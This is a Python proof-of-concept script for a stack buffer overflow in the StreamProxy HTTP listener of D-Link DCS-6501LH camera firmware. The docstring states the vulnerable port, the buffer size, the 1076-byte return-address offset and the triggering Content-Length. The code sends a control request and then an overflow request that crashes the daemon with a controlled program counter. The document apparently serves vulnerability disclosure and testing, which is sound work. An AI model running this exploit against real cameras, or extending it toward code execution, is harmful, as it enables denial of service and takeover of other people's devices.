#!/usr/bin/env python3
"""Proof of concept for the stack buffer overflow in the mydlink StreamProxy
HTTP handler of D-Link DCS-6501LH firmware V3.03.02 (aoni_ipc).

The StreamProxy listener on TCP port 7000 parses Content-Length from an HTTP
POST request and memcpy()s that many bytes into a 1024-byte stack buffer,
validating only that the value is below 5121.  The saved return address sits
1076 bytes above the buffer, so a Content-Length of 4000 with a 1500-byte body
overwrites it with 'A' (0x41414141).

Non-destructive: only a POST request is sent; nothing is stored on the device.

Usage:
    python3 poc.py <host> [port]
"""
import socket
import sys
import time

PORT = 7000
FILL = "A"
BODY = 1500
LENGTH = 4000


def request(content_length, body):
    return ("POST /x HTTP/1.1\r\nContent-Length: %d\r\n\r\n%s"
            % (content_length, body)).encode()


def send(payload, read=200):
    sock = socket.create_connection((HOST, PORT), 5)
    try:
        sock.sendall(payload)
        sock.settimeout(4)
        try:
            return sock.recv(read)
        except socket.timeout:
            return b"(timeout)"
    except ConnectionResetError:
        return b"(connection reset)"
    finally:
        sock.close()


def main():
    global HOST, PORT
    HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 7000

    print("[*] target %s:%d (mydlink StreamProxy)" % (HOST, PORT))

    resp = send(request(64, "A" * 16))
    print("[*] control (Content-Length 64): %r" % (resp[:60],))
    print("    expected: connection closed, service stays up")
    time.sleep(0.5)

    resp = send(request(LENGTH, FILL * BODY))
    print("[*] overflow (Content-Length %d, %d-byte body): %r"
          % (LENGTH, BODY, resp[:60]))
    print("    expected: connection closed; daemon crashes with")
    print("              pc = ra = 0x41414141")


if __name__ == "__main__":
    HOST = "127.0.0.1"
    main()
